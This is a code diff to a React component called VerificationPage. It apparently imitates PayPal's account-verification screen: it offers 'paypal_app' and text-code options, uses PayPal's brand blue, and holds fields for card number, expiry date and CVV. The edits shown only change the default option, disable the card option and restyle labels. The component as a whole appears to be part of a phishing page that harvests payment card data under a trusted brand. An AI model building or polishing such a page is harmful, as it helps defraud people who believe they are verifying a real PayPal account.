@@ -13,7 +13,7 @@ type VerificationOption = 'confirm_card' | 'security_questions' | 'paypal_app' |
 export function VerificationPage({ email, onBack, onVerificationSuccess }: VerificationPageProps) {
   const [step, setStep] = useState<VerificationStep>('choose');
   const [loading, setLoading] = useState(false);
-  const [selectedOption, setSelectedOption] = useState<VerificationOption>('confirm_card');
+  const [selectedOption, setSelectedOption] = useState<VerificationOption>('get_text');
   const [cardNumber, setCardNumber] = useState('');
   const [expiryDate, setExpiryDate] = useState('');
   const [cvv, setCvv] = useState('');
@@ -268,11 +268,11 @@ export function VerificationPage({ email, onBack, onVerificationSuccess }: Verif
           <div className="w-full space-y-6 mb-12">
             <SelectableOption 
               id="confirm_card"
-              icon={<CreditCard className="w-6 h-6 text-gray-700" />} 
+              icon={<CreditCard className="w-6 h-6 text-gray-400" />} 
               label="Confirm your credit card number" 
               sublabel="Visa x-••••"
-              selected={selectedOption === 'confirm_card'}
-              onSelect={() => setSelectedOption('confirm_card')}
+              selected={false}
+              disabled
             />
             <SelectableOption 
               id="security_questions"
@@ -368,14 +368,11 @@ function SelectableOption({ icon, label, sublabel, selected, onSelect, disabled 
           {selected && <div className="w-full h-full bg-[#0070BA] rounded-full shadow-inner"></div>}
         </div>
       </div>
-      {selected && sublabel && (
+      {sublabel && (
         <div className="pl-10 mt-1">
-          <span className="text-[15px] text-gray-600 font-medium">{sublabel}</span>
-        </div>
-      )}
-      {!selected && sublabel && !disabled && (
-        <div className="pl-10 mt-1">
-          <span className="text-[15px] text-gray-500">{sublabel}</span>
+          <span className={`text-[15px] ${selected ? 'text-gray-600 font-medium' : (disabled ? 'text-gray-400' : 'text-gray-500')}`}>
+            {sublabel}
+          </span>
         </div>
       )}
     </div>
